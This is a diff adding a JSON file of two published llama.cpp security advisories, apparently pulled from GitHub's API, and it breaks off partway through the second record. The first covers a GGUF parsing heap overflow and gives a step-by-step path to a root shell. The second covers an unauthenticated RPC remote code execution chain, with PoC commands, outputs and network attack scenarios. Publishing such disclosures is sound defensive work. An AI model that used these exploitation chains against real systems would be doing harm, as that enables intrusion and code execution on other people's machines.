@@ -1,0 +1,1592 @@
+[
+  {
+    "ghsa_id": "GHSA-3p4r-fq3f-q74v",
+    "cve_id": "CVE-2026-27940",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-3p4r-fq3f-q74v",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-3p4r-fq3f-q74v",
+    "summary": "Heap Buffer Overflow via Integer Overflow in `mem_size` Calculation \u2014 Bypass of CVE-2025-53630 Fix",
+    "description": "\r\n## Summary\r\n\r\nThe `gguf_init_from_file_impl()` in `gguf.cpp` is vulnerable to an Integer overflow, leading to an undersized heap allocation. We can then use the next `fread()` to write data past the buffer boundary.\r\n\r\nUsing the subsequent `fread()` writes 528+ bytes of attacker-controlled data past the buffer boundary. \r\n\r\nBy tuning the allocation size to fall within glibc's tcache range, we can bypass the heap integrity checks during cleanup, and then the subsequent `malloc()` calls will return memory pre-filled with attacker data from the GGUF file. \r\n\r\nI was able to eventually escalate this from a basic crash to full arbitrary code execution with a root shell spawned via `system(\"/bin/sh\")`. \r\n\r\nThis is a bypass of a similar bug in the same file - CVE-2025-53630, but the fix overlooked some areas (explained in the next section). \r\n\r\n## How it works\r\n\r\nThe vulnerability originates in the `gguf_init_from_file_impl` function within `ggml/src/gguf.cpp`. This function is responsible for parsing the GGUF model file format, including its metadata and tensor data. \r\n\r\n### Earlier Fix \r\n\r\nThe earlier vuln, CVE-2025-53630, patched an integer overflow by adding an overflow check on the `ctx->size` accumulation loop at line 642:\r\n\r\n```c\r\nif (SIZE_MAX - ctx->size < padded_size) {  // prevents ctx->size from WRAPPING\r\n    ...\r\n    return nullptr;\r\n}\r\nctx->size += padded_size;\r\n```\r\n\r\n### Checking Individually, but not the final Added Values\r\n\r\nBut if you scroll a little bit further down in the same file, the `mem_size` for the ggml context is computed without an overflow check:\r\n\r\n```c\r\nconst size_t mem_size =\r\n    params.no_alloc ?\r\n    (n_tensors    )*ggml_tensor_overhead() :\r\n    (n_tensors + 1)*ggml_tensor_overhead() + ctx->size;  // \u2190 INTEGER OVERFLOW\r\n```\r\n\r\nWhen `ctx->size` is close to `SIZE_MAX` (achievable via two large I8 tensors whose sizes pass the per-addition CVE-2025-53630 check), the addition wraps around to a small value. \r\n\r\nThe function iterates through the tensor information read from the GGUF file to calculate the total size required for all tensor data. This total is then accumulated in `ctx->size` (a `size_t` variable) at L641 with `ctx->size += padded_size;`. So each addition is individually checked, but not together. \r\n\r\n### Getting Closer \r\n\r\nWe can create a GGUF file with two I8 tensors where both tensors use `ne[0] = 0x7FFFFFFFFFFFFFC0` (9,223,372,036,854,775,744), which after padding (32-byte alignment) comes to:\r\n\r\n- **Tensor 1** contributing `padded_size = 0x7FFFFFFFFFFFFFC0` (already aligned)\r\n- **Tensor 2** contributing `padded_size = 0x7FFFFFFFFFFFFFC0` (same)\r\n\r\nSo the per-addition overflow check passes for each: `SIZE_MAX \u2212 first_padded \u2265 second_padded` holds true. After both additions, `ctx->size = 0xFFFFFFFFFFFFFF80`, which is `SIZE_MAX \u2212 127`. This is still a legitimate value - it's large, but it hasn't wrapped. So the earlier fix guard is satisfied. \r\n\r\n### The real issue : mem_size \r\n\r\nIf we go further down, we have `mem_size` which computes how much memory to allocate for the ggml context that'll hold the tensor data. \r\n\r\n```c\r\n        const size_t mem_size =\r\n            params.no_alloc ?\r\n            (n_tensors    )*ggml_tensor_overhead() :\r\n            (n_tensors + 1)*ggml_tensor_overhead() + ctx->size; // <- this is the core issue \r\n```\r\n\r\nFor our two tensors, `(n_tensors + 1) * ggml_tensor_overhead()` equals `3 \u00d7 368 = 1,104`. \r\n\r\nAdding this to `ctx->size`:\r\n\r\n```\r\nmem_size = 1,104 + (SIZE_MAX \u2212 127)\r\n         = 1,104 + 18,446,744,073,709,551,488\r\n         = 976   (wraps mod 2^64)\r\n```\r\n\r\nAnd on this particular addition, there is no overflow check. The result wraps around to just 976 bytes.\r\n\r\nJust after this, we have a `ggml_init` call with this small size, which in turn calls `malloc(976)` - i.e. it allocates a buffer much much smaller than what's required by the tensor data.\r\n\r\n### Tensor Creation with Wrapped Size \r\n\r\nAt L675 - we have the function which creates a blob tensor to hold all the tensor data: \r\n\r\n```c\r\ndata = ggml_new_tensor_1d(ctx_data, GGML_TYPE_I8, ctx->size);\r\n```\r\n\r\nFrom `ggml.c` we know that `ggml_tensor` is : \r\n\r\n```c\r\nstruct ggml_tensor * ggml_new_tensor_1d(\r\n        struct ggml_context * ctx,\r\n        enum   ggml_type      type,\r\n        int64_t ne0) {\r\n    return ggml_new_tensor(ctx, type, 1, &ne0);\r\n}\r\n```\r\n\r\nThat means, in our case - `ctx->size` (`SIZE_MAX \u2212 127`) will be passed as an `int64_t` parameter, which then causes it to be interpreted as a negative number (\u2212128). \r\n\r\nThen, inside `ggml_new_tensor_impl`, we have a series of implicit unsigned/signed conversions which cause the internal size calculations to also wrap around to a small value. \r\n\r\nThe pool bounds check then compares this small wrapped size against the 976-byte buffer and concludes that there's enough room. \r\n\r\nThe tensor struct (368 bytes) is then written within the buffer, and `data->data` is set to point at `buffer + 368`.\r\n\r\n\r\n### Heap Overflow \r\n\r\nAt line 684 is where the corruption actually happens. It reads the tensor data from the file into the allocated buffer.\r\n\r\n```c\r\nok = ok && gr.read(data->data, ctx->size);\r\n```\r\n\r\nThe `gr.read` call asks `fread` to read `SIZE_MAX - 127` bytes into a buffer that only has 608 (976 \u2212 368) bytes remaining. \r\n\r\nSo `fread` will read as much as the file provides but we can have attacker's data section of say 1136 bytes which will write 528 bytes past the end of the heap buffer. \r\n\r\nASAN confirms the overflow: \r\n\r\n```c\r\n==6441==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x519000000450\r\nWRITE of size 1136 at 0x519000000450 thread T0\r\n    #0 in fread\r\n    #1 in gguf_reader::read at gguf.cpp:285\r\n    #2 in gguf_init_from_file_impl at gguf.cpp:692\r\n0x519000000450 is located 0 bytes after 976-byte region\r\n```\r\n\r\nThat means we are in full control of what is overflowed, through the GGUF file's data section. I've explored this in the PoCs. \r\n\r\n### tcache bypass for Continued Execution\r\n\r\nOn most systems, `fread` returns a short count (the file runs out of data), so `ok` becomes `false` and the function enters its error cleanup path, which calls `ggml_free(ctx_data)` \u2192 `free()` on the corrupted heap buffer.\r\n\r\nWith my original PoC -> it simply resulted in a crash.  1,072-byte allocation \u2192 chunk size 1,088, the `free()` goes through glibc's slow path, which validates the next chunk's size field but finds it corrupted. So glibc aborts with `\"invalid next size (normal)\"` and the process crashes, which will lead to a DoS. \r\n\r\nBut we can actually tune the allocation size by choosing tensor dimensions that produce `mem_size = 976` (chunk size 992), which then ensures that the allocation falls within glibc's **tcache range** (chunks \u2264 1,040 bytes). \r\n\r\nThe `tcache` is a thread-local cache introduced in glibc 2.26 that uses a fast path for `free()` which does not validate the next chunk's size field. \r\n\r\nSo:\r\n\r\n- `free()` during error cleanup succeeds silently : no integrity check, no abort\r\n- Execution continues normally with corrupted heap state\r\n- The corrupted chunk is placed on a tcache free list\r\n\r\nSo when subsequent code calls `malloc()` with a matching size, glibc returns the corrupted chunk - and the attacker's data from the GGUF file will be returned from the memory. I've added in the PoC with return of the 64 `0xCAFEBABE` values coming from the GGUF data section. \r\n\r\n## Who's Affected \r\n- `ggml/src/gguf.cpp` : \r\n  - `mem_size` - the main vuln, missing overflow check\r\n  - `fread` into undersized buffer \r\n- `ggml/src/ggml.c` - `GGML_TENSOR_SIZE + obj_alloc_size` wrap \r\n\r\nThe vuln will trigger in any code path that calls `gguf_init_from_file()` with `no_alloc=false` which is :\r\n\r\n- `llama-quantize` : `tools/quantize/quantize.cpp`\r\n- `llama-imatrix` : `tools/imatrix/imatrix.cpp`\r\n- Control vectors | `common/common.cpp`\r\n- `llama-gguf` : `examples/gguf/gguf.cpp`\r\n\r\nThe main model loading path (`llama-model-loader.cpp`) uses `no_alloc=true` and is not affected.\r\n\r\n\r\n## PoCs \r\n\r\nI tested out the PoCs on a few different environments to be sure. Below are the platforms & envs I tested on: \r\n\r\n| Platform | OS | Arch | PoC | Result |\r\n|----------|----|------|-----|--------|\r\n| macOS | 15.4 | ARM64 (M1 Max) | crash | SIGSEGV (exit 139) |\r\n| Linux | Ubuntu 24.04 (glibc 2.39) | x86_64 | crash | SIGABRT (exit 134) |\r\n| Linux | Ubuntu 24.04 (glibc 2.39) | ARM64 (Docker) | crash | SIGABRT (exit 134) |\r\n| Linux | Ubuntu 24.04 (glibc 2.39) | ARM64 (Docker, ASAN) | crash | heap-buffer-overflow WRITE of 1136 into 976 bytes |\r\n| Linux | Ubuntu 24.04 (glibc 2.39) | ARM64 (Docker) | RCE (v2) | Attacker data in malloc (exit 0) |\r\n| Linux | Ubuntu 22.04 (glibc 2.35) | x86_64 (RunPod) | RCE (v3) | PC control: rbx=0x4141414141414141 |\r\n| Linux | Ubuntu 22.04 (glibc 2.35) | x86_64 (RunPod) | **RCE (v4)** | **Root shell via system(\"/bin/sh\")** |\r\n\r\n## How to test \r\n\r\n```bash\r\npython3 craft_gguf_poc.py poc_heap_overflow.gguf\r\n./build/bin/llama-gguf poc_heap_overflow.gguf r n\r\n# macOS: SIGSEGV (exit 139)\r\n# Linux: SIGABRT \"invalid next size\" (exit 134)\r\n```\r\n\r\n### RCE \u2014 shell execution (Linux/glibc, recommended)\r\n\r\n```bash\r\ngcc -O2 -o rce_v4 rce_harness_v4.c -Iggml/include -Lbuild/bin \\\r\n    -lggml -lggml-base -lggml-cpu -lstdc++ -lm -lpthread\r\nLD_LIBRARY_PATH=build/bin ./rce_v4\r\n# Generates GGUF at runtime, loads it, spawns /bin/sh shell\r\n```\r\n\r\n### Attacker data in malloc (Linux/glibc)\r\n\r\n```bash\r\npython3 craft_rce_poc_v2.py poc_rce_v2.gguf\r\ngcc -O2 -o rce_v2 rce_harness_v2.c -Iggml/include -Lbuild/bin \\\r\n    -lggml -lggml-base -lggml-cpu -lstdc++ -lm -lpthread\r\nLD_LIBRARY_PATH=build/bin ./rce_v2 poc_rce_v2.gguf\r\n# Clean exit (0), \"FOUND attacker pattern 0xcafebabe...\" messages\r\n```\r\n\r\n### PC control (Linux/glibc)\r\n\r\n```bash\r\npython3 craft_rce_poc_v3.py poc_rce_v3.gguf\r\ngcc -O2 -o rce_v3 rce_harness_v3.c -Iggml/include -Lbuild/bin \\\r\n    -lggml -lggml-base -lggml-cpu -lstdc++ -lm -lpthread\r\nLD_LIBRARY_PATH=build/bin ./rce_v3 poc_rce_v3.gguf\r\n# SIGSEGV \u2014 under GDB, rbx=0x4141414141414141\r\n```\r\n\r\n### Via llama-quantize (real-world attack surface)\r\n\r\n```bash\r\n./build/bin/llama-quantize --imatrix poc_heap_overflow.gguf dummy.gguf dummy.gguf q4_0\r\n# Overflow occurs during imatrix loading\r\n```\r\n\r\n\r\n## PoC Walkthrough\r\n\r\n### Getting to a Crash \r\n\r\n`craft_gguf_poc.py` (generating `poc_heap_overflow.gguf`) used two I8 tensors with `ne[0]` values chosen to make `ctx->size = SIZE_MAX - 31`:\r\n\r\n```\r\nTensor 1: ne[0] = INT64_MAX - 1  \u2192  padded_size = 2^63\r\nTensor 2: ne[0] = 2^63 - 34      \u2192  padded_size = 2^63 - 32\r\n\r\nCVE check for tensor 1: SIZE_MAX - 0 \u2265 2^63  \u2192  passes\r\nCVE check for tensor 2: SIZE_MAX - 2^63 = 2^63 - 1 \u2265 2^63 - 32  \u2192  passes\r\n\r\nctx->size = 2^63 + (2^63 - 32) = SIZE_MAX - 31\r\nmem_size  = 3 \u00d7 368 + (SIZE_MAX - 31) = 1,072  (wraps mod 2^64)\r\n```\r\n\r\n`ggml_init()` allocates 1,072 bytes. Inside that buffer, a tensor struct is placed at offset 0, and `data->data` points to offset 368 \u2014 leaving only 704 bytes. `fread()` at line 692 reads the full GGUF data section (2,048 bytes) into this space, overflowing by **1,344 bytes**. The error path calls `ggml_free()` \u2192 `free()` on the corrupted heap \u2192 crash.\r\n\r\n**Result**: SIGSEGV (exit 139) on macOS, SIGABRT with \"free(): invalid next size\" (exit 134) on Linux/glibc. See `craft_gguf_poc.py` and `poc_heap_overflow.gguf`.\r\n\r\nASAN confirmed the overflow:\r\n```\r\n==6441==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x519000000450\r\nWRITE of size 1136 at 0x519000000450 thread T0\r\n    #0 in fread\r\n    #1 in gguf_reader::read at gguf.cpp:285\r\n    #2 in gguf_init_from_file_impl at gguf.cpp:692\r\n0x519000000450 is located 0 bytes after 976-byte region\r\n```\r\n\r\n### Surviving the Crash (glibc tcache bypass)\r\n\r\nAs mentioned in the earlier explanation, the crash PoC's 1,072-byte allocation (chunk size 1,088) exceeds glibc's tcache maximum (~1,040 bytes), forcing `free()` through the slow path which validates the next chunk's size field - detecting corruption and aborting. \r\n\r\nBut just by adjusting the tensor dimensions, we can make the wrapped allocation fall within tcache range:\r\n\r\n```\r\nne[0] for both tensors = 0x7FFFFFFFFFFFFFC0\r\n\r\nctx->size = 0x7FFFFFFFFFFFFFC0 + 0x7FFFFFFFFFFFFFC0 = SIZE_MAX - 127\r\nmem_size  = 1,104 + (SIZE_MAX - 127) = 976  (wraps mod 2^64)\r\n\r\nmalloc(976) \u2192 chunk size 992 \u2192 tcache bin 60 (< 64 max bins) \u2192 TCACHE ELIGIBLE\r\n```\r\n\r\nAs expected, Execution continues normally.\r\n\r\n| | Crash PoC | tcache PoC |\r\n|--|--|--|\r\n| `mem_size` | 1,072 | 976 |\r\n| Chunk size | 1,088 (above tcache) | 992 (in tcache) |\r\n| `free()` | SIGABRT (integrity check) | **Succeeds** |\r\n| Post-overflow | Process killed | **Continues** |\r\n\r\nSee `craft_rce_poc_v2.py` and `poc_rce_v2.gguf`.\r\n\r\n### Fetching Data from Memory \r\n\r\nThe tcache bypass worked, heap is current, process is alive, and we have written past the glibc top chunk. Now `malloc()` call should carve from the corrupted top chunk and return attacker-controlled data from the GGUF data section. \r\n\r\nIn this PoC, I placed a fake top chunk header  at the overflow boundary (data section byte 608) followed by `OXCAFEBABE`. As expected, `malloc(1024)` returns our value. \r\n\r\n```\r\n[+] GGUF load returned NULL (overflow + cleanup completed)\r\n[+] Post-overflow malloc(1024) \u2192 0xaaaae37bfd00\r\n[!] FOUND attacker pattern 0xcafebabe00000000 at offset 368!\r\n[!] FOUND attacker pattern 0xcafebabe00000001 at offset 376!\r\n  ... (64 sequential attacker-controlled values) ...\r\n[!] FOUND attacker pattern 0xcafebabe0000003f at offset 872!\r\nEXIT: 0\r\n```\r\n\r\nTested on Ubuntu 24.04 (glibc 2.39), ARM64. See `rce_harness_v2.c`.\r\n\r\n### Getting to finer Pointer Control \r\nTo confirm that I can control the Program Counter, I added `0x4141414141414141` at the function pointer offset in the data section. \r\n\r\nGDB confirms that it works: \r\n\r\n```\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x0000597332b38492 in main at /tmp/rce_harness_v3.c:198\r\n198         ops->load(\"/bin/sh\");\r\nrip            0x597332b38492      0x597332b38492 <main+754>\r\nrbx            0x4141414141414141  4702111234474983745     \u2190 ATTACKER CONTROLLED\r\nrdi            0x597332b3910a      (address of \"/bin/sh\")\r\n```\r\n\r\nThe value gets loaded in the `rbx` register as the indirect call target. It crashed because it's not a valid address. We know what's going to be the next step, don't we? \r\n\r\nThis was tested on Ubuntu 22.04 (glibc 2.35), x86_64. See `craft_rce_poc_v3.py`, `poc_rce_v3.gguf`, and `rce_harness_v3.c`.\r\n\r\n### Shell \r\nThis PoC uses the resolved `system()` address at runtime within the same process, generates a malicious GGUF with that address embedded at the correct data section offset, loads it (triggering the overflow), then scans the corrupted heap for the injected address and calls it with `\"/bin/sh\"`.\r\n\r\n```\r\n=== GGUF Heap Overflow \u2192 Automatic Shell Execution ===\r\n\r\n[*] system() @ 0x7f0ef399bd70 (resolved at runtime, same process)\r\n\r\n[1] Generating malicious GGUF with system() address embedded...\r\n    Written: /tmp/poc_rce_auto.gguf\r\n\r\n[2] Loading malicious GGUF (triggers heap overflow + tcache bypass)...\r\ngguf_init_from_file_impl: failed to read tensor data binary blob\r\n[+] Load returned NULL \u2014 overflow + tcache cleanup succeeded\r\n\r\n[3] Scanning post-overflow heap for system() address...\r\n    FOUND system() at malloc(512)+224\r\n    Value: 0x00007f0ef399bd70 == system() @ 0x7f0ef399bd70\r\n\r\n[4] CONTROL-FLOW HIJACK: calling system(\"/bin/sh\")\r\n    Attacker-controlled function pointer from GGUF data section\r\n    \u2192 jumping to system() with \"/bin/sh\" argument\r\n\r\n# id\r\nuid=0(root) gid=0(root) groups=0(root)\r\n# exit\r\n\r\n[+] Shell exited. RCE demonstrated.\r\n```\r\n\r\nTested on Ubuntu 22.04 (glibc 2.35), x86_64, RunPod cloud GPU instance. See `rce_harness_v4.c`.\r\n\r\n--- \r\nnote - I've uploaded all PoCs to https://huggingface.co/adig/gguf-hpovflw-poc/tree/main . For security - I've kept it as private, please request invite for the PoCs, or I can share the PoC on a public URL if you would prefer that. ",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-3p4r-fq3f-q74v",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-27940",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-03-12T11:17:52Z",
+    "published_at": "2026-03-12T11:17:52Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "llama.cpp"
+        },
+        "vulnerable_version_range": "<= b8145",
+        "patched_versions": ">= b8146",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+        "score": 7.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-122",
+        "name": "Heap-based Buffer Overflow"
+      },
+      {
+        "cwe_id": "CWE-190",
+        "name": "Integer Overflow or Wraparound"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-122",
+      "CWE-190"
+    ],
+    "credits": [
+      {
+        "login": "adi0x90",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "adi0x90",
+          "id": 1782493,
+          "node_id": "MDQ6VXNlcjE3ODI0OTM=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/1782493?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/adi0x90",
+          "html_url": "https://github.com/adi0x90",
+          "followers_url": "https://api.github.com/users/adi0x90/followers",
+          "following_url": "https://api.github.com/users/adi0x90/following{/other_user}",
+          "gists_url": "https://api.github.com/users/adi0x90/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/adi0x90/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/adi0x90/subscriptions",
+          "organizations_url": "https://api.github.com/users/adi0x90/orgs",
+          "repos_url": "https://api.github.com/users/adi0x90/repos",
+          "events_url": "https://api.github.com/users/adi0x90/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/adi0x90/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 14,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "score": 7.8
+    }
+  },
+  {
+    "ghsa_id": "GHSA-j8rj-fmpv-wcxw",
+    "cve_id": "CVE-2026-34159",
+    "url": "https://api.github.com/repos/ggml-org/llama.cpp/security-advisories/GHSA-j8rj-fmpv-wcxw",
+    "html_url": "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-j8rj-fmpv-wcxw",
+    "summary": "Unauthenticated RCE via GRAPH_COMPUTE buffer=0 bypass in llama.cpp RPC backend",
+    "description": "### Summary\r\n\r\nThe RPC backend's `deserialize_tensor()` skips all bounds validation when a tensor's `buffer` field is 0. An unauthenticated attacker can read and write arbitrary process memory via crafted GRAPH_COMPUTE messages. Combined with pointer leaks from ALLOC_BUFFER/BUFFER_GET_BASE, this gives full ASLR bypass and remote code execution. No authentication required, just TCP access to the RPC server port.\r\n\r\n### Details\r\n\r\nIn `ggml/src/ggml-rpc/ggml-rpc.cpp`, `deserialize_tensor()` (called during GRAPH_COMPUTE) only validates the `data` pointer when `buffer != nullptr`:\r\n\r\n```cpp\r\n// Line 1177-1180: buffer=0 -> nullptr, validation skipped\r\nresult->buffer = reinterpret_cast<ggml_backend_buffer_t>(tensor->buffer);\r\nif (result->buffer && buffers.find(result->buffer) == buffers.end()) {\r\n    result->buffer = nullptr;\r\n}\r\n\r\n// Line 1182-1189: bounds check ONLY runs when buffer != nullptr\r\nif (result->buffer) {\r\n    // ... GGML_ASSERT checks on data pointer ...\r\n}\r\n\r\n// Line 1196: data pointer set unconditionally from attacker input\r\nresult->data = reinterpret_cast<void *>(tensor->data);\r\n```\r\n\r\nWhen `buffer=0`, the attacker-controlled `data` pointer goes straight to ggml compute kernels (e.g. `ggml_compute_forward_dup` does `memcpy` using `tensor->data`). This gives arbitrary read/write.\r\n\r\nThe SET_TENSOR bounds check (the RPC-04 fix) does not protect this path. GRAPH_COMPUTE uses `graph_compute()` -> `create_node()` -> `deserialize_tensor()`, a completely separate code path.\r\n\r\n**Exploitation chain:**\r\n\r\n1. ASLR bypass: `ALLOC_BUFFER` returns raw heap pointer; `BUFFER_GET_BASE` returns data area pointer. Raw addresses are used as handles with no indirection table.\r\n2. Arbitrary read: GRAPH_COMPUTE with `buffer=0` tensors + `OP_CPY` copies from any address into a readable buffer.\r\n3. Code pointer leak: Read the buffer struct's `iface` function pointers to get `libggml-base.so` base address.\r\n4. libc resolution: Read `free@GOT.PLT` from libggml-base.so, compute `system()` address via offset arithmetic.\r\n5. Function pointer overwrite: Overwrite a victim buffer struct's `iface.clear` with `system()`, place command string at offset 0 of the struct.\r\n6. Trigger: `BUFFER_CLEAR` calls `buffer->iface.clear(buffer, 0)` which becomes `system(\"attacker_command\")`.\r\n\r\n### PoC\r\n\r\nTested 2026-02-07 against rpc-server in Docker (Ubuntu 24.04, aarch64, commit `e0c93af2a03f5c53d052dfaefd86c06ed3784646`).\r\n\r\n```bash\r\n# Build (pinned commit for reproducible offsets)\r\ncd exploits/\r\ndocker build -t rpc-debug -f Dockerfile.rpc-pinned .\r\ndocker run -d --name rpc-debug -p 50052:50052 rpc-debug\r\n\r\n# Extract offsets (needed if rebuilding with different commit/distro)\r\ndocker exec rpc-debug /extract_offsets.sh\r\n\r\n# Run full RCE chain\r\npython3 rpc_graph_compute_poc.py 127.0.0.1 50052\r\n\r\n# Verify\r\ndocker exec rpc-debug cat /tmp/pwned\r\n# uid=0(root) gid=0(root) groups=0(root)\r\n```\r\n\r\nPoC output:\r\n\r\n```\r\nPhase 1 - Pointer Leak:\r\n  Buffer A struct: 0x0000aaab1ddc4f70\r\n  Buffer A data:   0x0000aaab1ddc7800\r\n\r\nPhase 2 - Arbitrary Copy (buffer=0):\r\n  Buffer B after: b'EXPLOITED_BY_BUFFER_ZERO_BYPASS!'\r\n  [!!!] MATCH - buffer=0 arbitrary copy CONFIRMED\r\n\r\nPhase 3 - Function Pointer Leak:\r\n  clear = 0x0000ffffaac0ece4 (libggml-base.so)\r\n\r\nPhase 4 - Resolve system():\r\n  system() = 0x0000ffff9f4bcec4\r\n\r\nPhase 5 - RCE:\r\n  [!!!] Server responded - command executed successfully!\r\n```\r\n\r\nThe server crashes (SIGBUS, exit 135) shortly after command execution during cleanup of the corrupted buffer struct. The command runs successfully and the BUFFER_CLEAR response is sent back before the crash. An attacker could avoid the crash by restoring the original iface struct via a second GRAPH_COMPUTE copy before triggering.\r\n\r\n### Impact\r\n\r\nRemote code execution. Any unauthenticated TCP client that can reach the RPC server port (default 50052) gets arbitrary command execution as the server process user (often root in Docker).\r\n\r\n- Defeats ASLR via protocol-level pointer leaks\r\n- Defeats NX via function pointer hijacking (no shellcode needed)\r\n- Stack canaries and RELRO are irrelevant since this is a heap struct overwrite\r\n\r\nAttack scenarios:\r\n\r\n- Lateral movement in corporate/cloud networks: scan for port 50052 on GPU servers\r\n- Internet exposure via Docker `-p 50052:50052` or `--host 0.0.0.0`\r\n- Local privilege escalation from any process on the same host\r\n\r\nThe RPC backend must be explicitly enabled (`-DGGML_RPC=ON`) and defaults to localhost, but the intended use case is distributed inference across machines, so network exposure is expected.\r\n\r\n### Relation to prior CVEs\r\n\r\nThis vulnerability shares the same root cause as two previously patched CVEs:\r\n\r\n- **CVE-2024-42478** (GHSA-xcr4-8r59-4fh2): OOB read via `GET_TENSOR` - patched by adding bounds validation in the GET_TENSOR handler.\r\n- **CVE-2024-42479** (GHSA-g84r-q9f6-3frf): OOB read/write via `SET_TENSOR` - patched by adding a `// sanitize tensor->data` bounds check in `set_tensor()` (lines 1227-1237).\r\n\r\nAll three share the same underlying bug: `deserialize_tensor()` does not validate `tensor->data` when `buffer=0`. The 2024 patches added bounds checks in the GET_TENSOR and SET_TENSOR command handlers, but the GRAPH_COMPUTE command takes a separate code path (`graph_compute()` -> `create_node()` -> `deserialize_tensor()`) that was never patched. The buffer=0 bypass has been present since the initial RPC implementation (PR #6829, merged 2024-05-14).\r\n\r\nThis variant is more severe than the prior two because GRAPH_COMPUTE processes multiple tensors with arbitrary operations, giving the attacker both read and write primitives in a single request. The prior CVEs only gave read (GET_TENSOR) or write (SET_TENSOR) individually.\r\n\r\n### Disclosure context\r\n\r\nThis was reported to CERT/CC on 2026-02-08 as VU#748698. CERT/CC closed the case, so this report is being filed directly with the maintainers.\r\n\r\nThe project's SECURITY.md explicitly excludes RPC from vulnerability scope, stating: \"Do not use the RPC backend\" and \"none of the topics under 'Using llama.cpp securely' are considered vulnerabilities.\" However, a full-chain unauthenticated RCE with a working exploit against a network service that ships in the official build system warrants maintainer awareness regardless of scope policy. The RPC backend is used in production for distributed inference across machines.",
+    "severity": "critical",
+    "author": null,
+    "publisher": {
+      "login": "ggerganov",
+      "id": 1991296,
+      "node_id": "MDQ6VXNlcjE5OTEyOTY=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1991296?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/ggerganov",
+      "html_url": "https://github.com/ggerganov",
+      "followers_url": "https://api.github.com/users/ggerganov/followers",
+      "following_url": "https://api.github.com/users/ggerganov/following{/other_user}",
+      "gists_url": "https://api.github.com/users/ggerganov/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/ggerganov/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/ggerganov/subscriptions",
+      "organizations_url": "https://api.github.com/users/ggerganov/orgs",
+      "repos_url": "https://api.github.com/users/ggerganov/repos",
+      "events_url": "https://api.github.com/users/ggerganov/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/ggerganov/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-j8rj-fmpv-wcxw",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-34159",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-03-26T16:10:09Z",
+    "published_at": "2026-03-26T09:59:34Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "llama.cpp"
+        },
+        "vulnerable_version_range": "<= b7991",
+        "patched_versions": "",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-119",
+        "name": "Improper Restriction of Operations within the Bounds of a Memory Buffer"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-119"
+    ],
+    "credits": [
+      {
+        "login": "las7",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "las7",
+          "id": 98077186,
+          "node_id": "U_kgDOBdiKAg",
+          "avatar_url": "https://avatars.githubusercontent.com/u/98077186?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/las7",
+          "html_url": "https://github.com/las7",
+          "followers_url": "https://api.github.com/users/las7/followers",
+          "following_url": "https://api.github.com/users/las7/following{/other_user}",
